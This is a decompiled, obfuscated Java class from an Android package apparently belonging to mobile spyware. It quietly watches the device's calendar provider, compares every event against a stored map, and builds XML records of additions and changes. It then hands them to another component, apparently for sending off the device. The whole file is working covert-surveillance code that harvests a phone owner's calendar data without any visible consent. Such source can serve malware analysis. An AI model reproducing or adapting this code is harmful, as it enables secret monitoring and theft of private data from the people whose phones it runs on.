package com.network.android.monitor.observer;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Xml;
import com.network.android.SmsReceiver;
import com.network.android.j;
import com.network.i.e;
import java.io.StringWriter;
import java.util.HashMap;
import java.util.Map;
import java.util.Timer;
import org.xmlpull.v1.XmlSerializer;

public final class a extends r {
    private static final String[] b = new String[0];
    private static Handler e;

    /* renamed from: a  reason: collision with root package name */
    Timer f86a = new Timer();
    private ContentObserver f;
    private int g;
    private Map h = new HashMap();
    private boolean i = false;

    static {
        HandlerThread handlerThread = new HandlerThread("AndroidCalendarWatcher");
        handlerThread.start();
        e = new Handler(handlerThread.getLooper());
    }

    public final com.network.android.monitor.b.a a(Context context) {
        boolean z;
        boolean z2 = false;
        try {
            com.network.android.c.a.a.a("readCalendar start");
            if (!this.i) {
                com.network.android.c.a.a.a("change calendar - calendar map was not loaded!!!!");
            } else {
                Cursor a2 = com.network.a.a.a(context.getContentResolver());
                if (a2 != null) {
                    this.g = this.h.size();
                    com.network.android.c.a.a.a("curentCount: " + a2.getCount() + " previous: " + this.g);
                    HashMap hashMap = new HashMap();
                    XmlSerializer newSerializer = Xml.newSerializer();
                    StringWriter stringWriter = new StringWriter();
                    SmsReceiver.a(newSerializer, stringWriter);
                    newSerializer.startTag("", "calendar");
                    try {
                        com.network.android.c.a.a.a("AndroidCalendarWatcher Change or delete Calendar event ");
                        int i2 = 0;
                        while (a2.moveToNext()) {
                            int i3 = i2 + 1;
                            try {
                                if (i3 % 100 == 0) {
                                    com.network.android.c.a.a.a("AndroidCalendarWatcher readCalendar counter % 100 : SLEEP_FOR_READ");
                                    Thread.sleep(3);
                                }
                                StringBuffer stringBuffer = new StringBuffer();
                                com.network.a.a.a(a2, stringBuffer);
                                String string = a2.getString(4);
                                int i4 = a2.getInt(7);
                                com.network.android.c.a.a.a("AndroidCalendarWatcher Map Calendar position:" + a2.getPosition() + " isDeleted: " + i4);
                                if (i4 == 0) {
                                    String stringBuffer2 = stringBuffer.toString();
                                    hashMap.put(string, Integer.valueOf(stringBuffer2.hashCode()));
                                    Integer num = (Integer) this.h.remove(string);
                                    if (num == null) {
                                        com.network.a.a.a(newSerializer, "add", string, stringBuffer2, e.b());
                                        i2 = i3;
                                        z2 = true;
                                    } else if (stringBuffer2.hashCode() != num.intValue()) {
                                        com.network.a.a.a(newSerializer, "update", string, stringBuffer2, e.b());
                                        z = true;
                                        z2 = z;
                                        i2 = i3;
                                    }
                                }
                                z = z2;
                                z2 = z;
                                i2 = i3;
                            } catch (Throwable th) {
                                com.network.android.c.a.a.a("AndroidCalendarWatcher Event Exception- " + th.getMessage(), th);
                                i2 = i3;
                            }
                        }
                        if (a2 != null && !a2.isClosed()) {
                            a2.close();
                        }
                    } catch (Throwable th2) {
                        if (a2 != null && !a2.isClosed()) {
                            a2.close();
                        }
                        throw th2;
                    }
                    for (Map.Entry entry : this.h.entrySet()) {
                        com.network.a.a.a(newSerializer, "update", (String) entry.getKey(), null, e.b());
                    }
                    this.h = hashMap;
                    if (z2) {
                        newSerializer.endTag("", "calendar");
                        SmsReceiver.a(newSerializer);
                        j.a(context, stringWriter.toString(), (String[]) null, (byte[][]) null);
                    }
                    com.network.android.c.a.a.a("AndroidCalendarWatcher readCalendar end");
                }
            }
        } catch (Throwable th3) {
            com.network.android.c.a.a.a("AndroidCalendarWatcher Calendar listener Exception- " + th3.getMessage(), th3);
        }
        return null;
    }

    @Override // com.network.android.monitor.a.d
    public final void a(com.network.android.monitor.a.a aVar) {
        super.a(aVar);
        com.network.android.c.a.a.a("AndroidCalendarWatcher start ");
        try {
            com.network.e.a.a aVar2 = (com.network.e.a.a) aVar;
            Context a2 = aVar2.a();
            if (this.f == null) {
                Context a3 = aVar2.a();
                this.f = new d(this, aVar2);
                a3.getContentResolver().registerContentObserver(com.network.a.a.a(), true, this.f);
            }
            ContentResolver contentResolver = a2.getContentResolver();
            com.network.android.c.a.a.a("AndroidCalendarWatcher read map delay:0");
            e.postDelayed(new b(this, contentResolver), 0);
        } catch (Throwable th) {
            com.network.android.c.a.a.a("AndroidCalendarWatcher listener Exception- " + th.getMessage(), th);
        }
    }

    @Override // com.network.android.monitor.observer.r
    public final void a(com.network.e.a.a aVar) {
        try {
            com.network.android.c.a.a.a("readCalendar");
            e.postDelayed(new c(this, aVar), 1000);
        } catch (Throwable th) {
            com.network.android.c.a.a.a("calendar service start listener Exception- " + th.getMessage(), th);
        }
    }

    @Override // com.network.android.monitor.observer.r
    public final String[] a() {
        return b;
    }
}
